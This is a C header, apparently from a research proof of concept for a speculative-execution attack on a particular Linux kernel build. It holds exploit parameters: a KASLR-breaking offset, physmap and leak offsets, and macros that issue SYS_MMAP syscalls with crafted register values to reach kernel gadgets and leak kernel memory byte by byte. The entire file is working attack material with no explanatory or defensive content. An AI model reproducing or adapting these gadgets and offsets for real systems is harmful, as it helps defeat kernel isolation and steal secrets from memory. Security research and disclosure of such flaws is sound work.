// SPDX-License-Identifier: GPL-3.0-only
#define OFFS 0xcc0
//#define LEAK_START 0x110c908 // a story about dogs
#define LEAK_START 0x10baa41
#define FIRST_BYTE '3'

#define MMAP_LAST_TGT     0x3040f
#define MMAP_RET_OFFSET   0x30416
#define MMAP_BB_SZ        (MMAP_RET_OFFSET - MMAP_LAST_TGT)
#define KASLR_OFFSET      0x8b3ca8
#define CALL_KASLR_GADGET(probe_off) syscall(\
    SYS_MMAP,\
    0xaaaaaaaaaaaaaaaaUL, /*rdi*/ \
    0xbbbbbbbbbbbbbbbbUL, /*rsi*/ \
    0xfbbbbbbbbbbbbb80UL, /*rdx*/ \
    probe_off,            /*rcx*/ \
    0xccccccccccccccccUL, /*r08*/ \
    0xddddddddddddddddUL  /*r09*/ )
#define PA_OFFSET         0x8b3ca8
#define CALL_PA_GADGET CALL_KASLR_GADGET
#define PHYSMAP_OFFSET    0x8b3caf
#define CALL_PHYSMAP_GADGET CALL_KASLR_GADGET

// ffffffff81068253 module finalize
#define LEAK_ASCII_OFFSET 0x68253
#define LEAK_ASCII_STRIDE (1UL<<14)
#define CALL_LEAK_ASCII_GADGET(secret_ptr, rb, lower) syscall(\
    SYS_MMAP,\
    secret_ptr - 0x3e,      /*rdi*/ \
    rb - (lower<<6) - 0x18, /*rsi*/ \
    0xddddddddddddddddUL,   /*rdx*/ \
    0xccccccccccccccccUL,   /*rcx*/ \
    0xddddddddddddddddUL,   /*r08*/ \
    0xddddddddddddddddUL    /*r09*/ )

#define LEAK_OFFSET       0x7538fa // 0xffffffff817538fa
#define LEAK_STRIDE (1UL<<11)
#define CALL_LEAK_GADGET(secret_ptr, rb, lower) syscall(\
    SYS_MMAP,\
    0xaaaaaaaaaaaaaaaaUL,      /*rdi*/ \
    rb - lower*8,              /*rsi*/ \
    0xbbbbbbbbbbbbbbbbUL,      /*rdx*/ \
    secret_ptr - 2,            /*rcx*/ \
    0xddddddddddddddddUL,      /*r08*/ \
    0xddddddddddddddddUL       /*r09*/ )
